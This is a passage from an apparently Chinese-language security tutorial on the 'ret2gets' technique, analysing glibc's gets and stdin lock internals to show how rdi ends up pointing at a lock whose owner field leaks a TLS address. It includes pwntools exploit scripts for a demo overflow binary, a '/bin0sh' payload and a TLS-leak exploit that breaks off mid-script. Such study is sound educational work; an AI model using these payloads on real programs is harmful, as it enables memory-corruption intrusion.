<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> cnt;</span><br><span class="line">    <span class="type">void</span> *owner;</span><br><span class="line">&#125; _IO_lock_t;</span><br></pre></td></tr></table></figure>

<p>实际上我们被优化后的 <code>gets函数</code> 执行之后 <code>rdi寄存器</code> 所指向的 <code>_IO_stdfile_0_lock</code> 其实就是 <code>FILE结构体</code> 的 <code>_IO_lock_t *_lock; </code><br>而这个结构体的里面的这个 <code>owner</code> 在一定条件下它存储的是 <code>TLS的地址</code>， 而 <code>TLS的地址</code> 和 <code>libc基地址</code> 的偏移是固定的，所以如果我们可以控制程序流，那么我们可以采用下面思路:</p>
<ol>
<li>执行一次 <code>gets</code>，这时 <code>rdi寄存器</code> 指向这个 <code>_lock</code></li>
<li>我们再执行一次 <code>gets</code>，这样就可以往 <code>_lock</code> 里面写东西用来填充，如果程序中有 <code>printf</code> 我们甚至可以写入 <code>%p</code> 等格式化字符串来泄露地址</li>
<li>如果我们是调用 <code>puts</code> 那么在上面第二次 <code>gets</code> 的时候就可以填充一些 <code>特定的东西</code> 绕过一些检测，从而是的 <code>puts</code> 可以输出存放在 <code>owner</code> 中的 <code>TLS地址</code></li>
</ol>
<p>由此我们已经知道大致的利用思路和漏洞的大概，下面就是通过源码分析来了解我们需要绕过什么保护从而达到我们想要的效果</p>
<h3 id="gets源码分析"><a href="#gets源码分析" class="headerlink" title="gets源码分析"></a><strong>gets源码分析</strong></h3><h4 id="IO-stdfile-0-lock从哪来的"><a href="#IO-stdfile-0-lock从哪来的" class="headerlink" title="_IO_stdfile_0_lock从哪来的"></a><strong>_IO_stdfile_0_lock从哪来的</strong></h4><p>下面以gets的源码为例展开分析，源码地址<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31">gets</a>（链接glibc为 2.35）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line">_IO_gets (<span class="type">char</span> *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line">  <span class="type">char</span> *retval;</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdin</span>);     <span class="comment">// 对标准输入流stdin加锁，防止多线程环境下多个线程同时操作输入流导致数据竞争</span></span><br><span class="line">  ch = _IO_getc_unlocked (<span class="built_in">stdin</span>);  <span class="comment">// 通过_IO_getc_unlocked无锁方式读取第一个字符</span></span><br><span class="line">  <span class="comment">// 若首字符是EOF（文件结束符或输入错误），直接返回NULL</span></span><br><span class="line">  <span class="comment">// 若首字符是换行符\n，则count=0，表示空字符串</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      retval = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">goto</span> unlock_return;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is very tricky since a file descriptor may be in the</span></span><br><span class="line"><span class="comment">	 non-blocking mode. The error flag doesn&#x27;t mean much in this</span></span><br><span class="line"><span class="comment">	 case. We return an error only when there is a new error. */</span></span><br><span class="line">      <span class="type">int</span> old_error = <span class="built_in">stdin</span>-&gt;_flags &amp; _IO_ERR_SEEN;</span><br><span class="line">      <span class="built_in">stdin</span>-&gt;_flags &amp;= ~_IO_ERR_SEEN;</span><br><span class="line">      buf[<span class="number">0</span>] = (<span class="type">char</span>) ch;</span><br><span class="line">      count = _IO_getline (<span class="built_in">stdin</span>, buf + <span class="number">1</span>, INT_MAX, <span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">stdin</span>-&gt;_flags &amp; _IO_ERR_SEEN)</span><br><span class="line">	&#123;</span><br><span class="line">	  retval = <span class="literal">NULL</span>;</span><br><span class="line">	  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	<span class="built_in">stdin</span>-&gt;_flags |= old_error;</span><br><span class="line">    &#125;</span><br><span class="line">  buf[count] = <span class="number">0</span>;</span><br><span class="line">  retval = buf;</span><br><span class="line">unlock_return:</span><br><span class="line">  _IO_release_lock (<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数的开头，它使用 <code>_IO_acquire_lock</code>，在函数结束时，它使用 <code>_IO_release_lock</code>。这个想法是， 获取锁会告诉其他线程 <code>stdin</code> 当前正在使用中，并且尝试访问 <code>stdin</code> 的任何其他线程将被迫等待，直到该线程释放锁，告诉其他线程 <code>stdin</code> 不再使用。</p>
<p><code>_IO_acquire_lock</code>&#x2F;<code>_IO_release_lock</code><br>这些<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88">stdio-lock.h - sysdeps&#x2F;nptl&#x2F;stdio-lock.h - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer</a>如下:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#  define _IO_acquire_lock(_fp) \</span><br><span class="line">  <span class="keyword">do</span> &#123;									      \</span><br><span class="line">    FILE *_IO_acquire_lock_file						      \</span><br><span class="line">	__attribute__((<span class="title function_ invoke__">cleanup</span> (_IO_acquire_lock_fct)))			      \</span><br><span class="line">	= (_fp);							      \</span><br><span class="line">    _IO_flockfile (_IO_acquire_lock_file);</span><br><span class="line"># <span class="keyword">else</span></span><br><span class="line">#  ...</span><br><span class="line"># endif</span><br><span class="line"># define _IO_release_lock(_fp) ; &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>从中可以得出 <code>_IO_flockfile</code> 和 <code>_IO_acquire_lock_fct</code> 两个重要功能。<br><code>__attribute__（（cleanup））</code> 可能看起来很奇怪，但它所做的只是在人工 <code>do-while(0)</code> 块结束时（基本上在 IO 函数结束时）在 <code>_fp</code> 上调用 <code>_IO_acquire_lock_fct</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__attribute__ ((__always_inline__))</span><br><span class="line">_IO_acquire_lock_fct (FILE **p)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp = *p;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_USER_LOCK) == <span class="number">0</span>)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于锁定和解锁的 2 个宏是 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L282">_IO_flockfile</a> 和 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L284">_IO_funlockfile</a>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_flockfile(_fp) \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_funlockfile(_fp) \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)-&gt;_lock)</span></span><br></pre></td></tr></table></figure>

<p><code>_IO_USER_LOCK=0x8000</code> 是一个宏，它似乎表明是否应该使用内置锁定。这通常在内部使用，例如在 <code>printf</code> 中的帮助程序流中，这通常在内部使用，例如在 <code>printf</code> 中的帮助程序流中。但是不重要我们学习ret2gets需要了解这些，因为此检查将始终通过 <code>stdin</code> （或任何与此相关的标准流）。最后，我们来看看我们关心的宏：<code>_IO_lock_lock</code> 和 <code>_IO_lock_unlock</code>。</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L37">_IO_lock_lock</a> 和 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67">_IO_lock_unlock</a> 定义为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;						      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((_name).owner != __self)					      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">	lll_lock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">        (_name).owner = __self;						      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">    ++(_name).cnt;							      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (--(_name).cnt == 0)						      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">        (_name).owner = NULL;						      \</span></span><br><span class="line"><span class="meta">	lll_unlock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>请注意，<code>_name</code> 就是锁本身(也就是我们刚刚说的 <code>_IO_lock_t *_lock</code>)，在 <code>gets</code> 的情况下，也就是 <code>_IO_stdfile_0_lock</code>。<br>如果 <code>owner</code> 与 <code>THREAD_SELF</code> 不同（即 lock 由不同的线程拥有），它会等待该线程使用 <code>lll_lock</code> <em>解锁</em> ，然后声明锁的所有权。解锁时，它会删除其所有权，并发出信号表明它不再与 <code>lll_unlock</code> 一起使用。</p>
<p>观察源码可知 <code>_IO_lock_unlock</code> 是大多数 <code>IO函数</code>（包括 <code>gets</code>）的末尾调用的内容，<br>所以它是返回之前最后一个对寄存器有影响的函数，所以探究 <code>rdi寄存器</code> 为什么保存 <code>_IO_stdfile_0_lock</code> 就需要从这个函数入手<br>直接观察gets函数结尾，我们发现gets函数最后退出的时候是不会改变rdi寄存器的<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/3.png"></p>
<p>这里是gets调用 <code>_IO_lock_unlock</code> 的部分汇编代码<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/4.png"><br>这部分代码中 <code>rbp</code> 存储了 <code>stdin</code> 的地址，因此 <code>0x080656</code> 这里的 <code>test</code> 是检查 <code>_IO_USER_LOCK_</code><br><code>0x08065F</code> 地址处是 <code>rbp+0x88</code> 我们知道 <code>_Lock</code> 就存储在 <code>FILE</code> 结构体(stdin就属于FILE结构体)的0x88偏移处</p>
<p>这里展示一下 <code>FILE结构体</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">//用来表示当前用于存储与文件流相关的标志，比如：当前文件流是有缓冲还是无缓冲，文件流是否支持读取，文件流是否遇到了错误等等具体在下面有所列举</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">//指向当前读取位置的指针</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">//指向读取缓冲区结束位置的指针</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">//指向读取缓冲区开始位置的指针，通常三个一起使用来进行数据的读取操作，其中base和end分别标记了起始和终点的位置，ptr则进行数据的遍历。</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">//指向当前写入位置的指针。</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">//指向写入缓冲区结束位置的指针。</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">//指向写入缓冲区结束位置的指针。同上三个一起完成数据的写入操作。</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">//指向整个缓冲区（包括读取和写入缓冲区）开始位置的指针。</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">//指向整个缓冲区结束位置的指针。</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">//指向旧读取区域的开始位置的指针，用于标记/回退功能。</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">//指向备份区域的第一个有效字符的指针。</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">//指向非当前读取区域的结束位置的指针。</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>    <span class="comment">//指向文件流的标记链表的头指针，用于流中的标记和定位。</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>        <span class="comment">//指向下一个 _IO_FILE 结构体的指针，用于维护一个文件流链表。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;              <span class="comment">//存储与此文件流相关联的文件描述符。</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;          </span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;               <span class="comment">//存储与此文件流相关联的文件描述符。</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset;   <span class="comment">//存储旧的文件偏移量，用于定位操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span>     </span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;       <span class="comment">//存储旧的文件偏移量，用于定位操作</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;       <span class="comment">//存储虚拟函数表（vtable）的偏移量。</span></span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];                <span class="comment">//一个小型的字符数组，用于在没有分配完整缓冲区时的简单操作。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;                 <span class="comment">//指向互斥锁的指针，用于线程安全。</span></span><br><span class="line">  # 最后gets执行结束之后rdi就是指向这里</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以这里 <code>rdi</code> 变成了 <code>stdin._lock</code> 也就是变成了 <code>_IO_stdfile_0_lock</code><br>具体信息可通过下图gdb调试来得到，现在我们知道了 <code>_IO_stdfile_0_lock</code> 的来源<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/5.png"></p>
<p>注意在<code>_IO_lock_unlock</code>函数结束后下面还有一个 <code>__lll_lock_wait_private</code> 函数，但是没有关系，因为这个函数并不会破坏 <code>rdi</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/6.png"></p>
<h4 id="为什么-IO-stdfile-0-lock要放入到rdi寄存器里面"><a href="#为什么-IO-stdfile-0-lock要放入到rdi寄存器里面" class="headerlink" title="为什么_IO_stdfile_0_lock要放入到rdi寄存器里面"></a><strong>为什么_IO_stdfile_0_lock要放入到rdi寄存器里面</strong></h4><p>上面我们分析的<code>_IO_stdfile_0_lock</code> 的来源，但是为什么要把 <code>_lock</code> 会被加载到 <code>RDI</code> 中?</p>
<p>猜测这是编译器优化的结果，在调用 <code>lll_unlock</code> 的情况下，<code>_lock</code> 的地址作为唯一的参数直接传递给 <code>futex</code> 包装器（即通过 <code>rdi</code> 寄存器）。因此，它将 <code>_lock</code> 加载到 <code>rdi</code> 中，这样它就不需要使用额外的 <code>assignment</code> 来准备对 <code>futex</code> 的调用，例如 <code>mov rdi, [register containing _lock]</code> ，从而节省了空间和时间。</p>
<p>下面来看一下2.30之前的glibc中的 <code>_IO_lock_unlock</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/7.png"></p>
<p>上图是glibc-2.29的 <code>_IO_lock_unlock</code> 函数<br>我们可以看到它不是将其加载到 <code>rdi</code> 中，而是使用 <code>mov rdx,[rbp+0x88]</code> 将其加载到 <code>rdx</code> 中，然后使用 <code>lea rdi,[rdx]</code> 加载到 <code>rdi</code> 中，这也说明 <code>_lock</code> 只有在非常特定的条件下才会被加载到 <code>rdi</code> 中，所以ret2gets并非在所有版本的glibc中都使用，它可能仅在部分高版本中适用</p>
<h4 id="ret2gets的具体利用方法"><a href="#ret2gets的具体利用方法" class="headerlink" title="ret2gets的具体利用方法"></a><strong>ret2gets的具体利用方法</strong></h4><p>上面就是gets函数源码的大致流程，那么通过分析我们就知道我们需要绕过的检测其实就是 <code>_IO_lock_lock</code> 和 <code>_IO_lock_unlock</code> 两个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;						      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((_name).owner != __self)					      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">	lll_lock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">        (_name).owner = __self;						      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">    ++(_name).cnt;							      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (--(_name).cnt == 0)						      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">        (_name).owner = NULL;						      \</span></span><br><span class="line"><span class="meta">	lll_unlock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<ol>
<li>由于 <code>_IO_lock_unlock</code> 有一个 <code>--(_name).cnt == 0</code> 一旦这个判断成功那么我们的 <code>owner</code> 就会变成 <code>NULL</code> 我们就无法再后续的 <code>puts</code> 中拿到 <code>TLS地址</code>，也就是说我们需要覆盖 <code>_IO_lock_t</code> 结构体的 <code>cnt</code> 不能为 <code>1</code></li>
<li>我们需要注意 <code>_IO_lock_t</code> 结构体 在 <code>owner参数</code> 之前不能有 <code>\x00</code> 否则 <code>puts</code> 输出的时候会被截断</li>
<li>我们输入的数据第五个字节会被 <code>减去1</code> (也就是cnt会被减去1)</li>
</ol>
<p>对于第三条我们依旧使用之前的这个例子来证明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;ROP me if you can!&quot;</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = context.binary = ELF(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">p = e.process()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于最后一个调用的函数是gets，所以最后main函数返回的时候 rdi 就是指向我们的 _IO_lock_t 结构体地址</span></span><br><span class="line"><span class="comment"># 所以我们只需要溢出之后调用一次gets就可以往 _IO_lock_t 里面写入东西了</span></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># saved rbp</span></span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ROP me if you can!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin&quot;</span> + p8(u8(<span class="string">b&quot;/&quot;</span>)+<span class="number">1</span>) + <span class="string">b&quot;sh&quot;</span>)</span><br><span class="line"><span class="comment"># 这里第五个字节会被-1所以传入的时候需要+1</span></span><br><span class="line"><span class="comment"># 我们传入 /bin0sh 字符串</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下面进入调试看看我们打入的 <code>bin0sh字符串</code> 会如何变化 (下面这是两张截图拼一起了，看起来有点怪，将就一下)<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/8.png"></p>
<p>总之我们可以知道，我们的第五个字符会被减去1</p>
<p>所以如果我们希望利用 <code>puts函数</code> 来泄露出 <code>owner</code> 中存储的 <code>TLS地址</code> 那么我们可以使用下面这个payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">4</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 这里填充 \x00\x00\x00 开头本来就是\x00</span></span><br></pre></td></tr></table></figure>

<p>而这个payload会让我们的 <code>_IO_lock_t</code>结构体中的  <code>lock</code> 赋值为 <code>AAAA</code> 而将 <code>cnt</code> 变为 <code>\x00\x00\x00\x00</code><br>这个时候 <code>cnt-1</code> 反而会让 <code>\x00\x00\x00\x00</code> 通过整数溢出变成 <code>\xff\xff\xff\xff</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/9.png"></p>
<p>这样我们就可以顺利绕过 <code>\x00</code> 导致的 <code>puts函数</code> 输出的截断了<br>所以上述例子泄露TLS地址的exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc-2.30 to glibc-2.36</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = context.binary = ELF(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc&quot;</span>)</span><br><span class="line">p = e.process()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># saved rbp</span></span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line">payload += p64(e.plt.puts)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ROP me if you 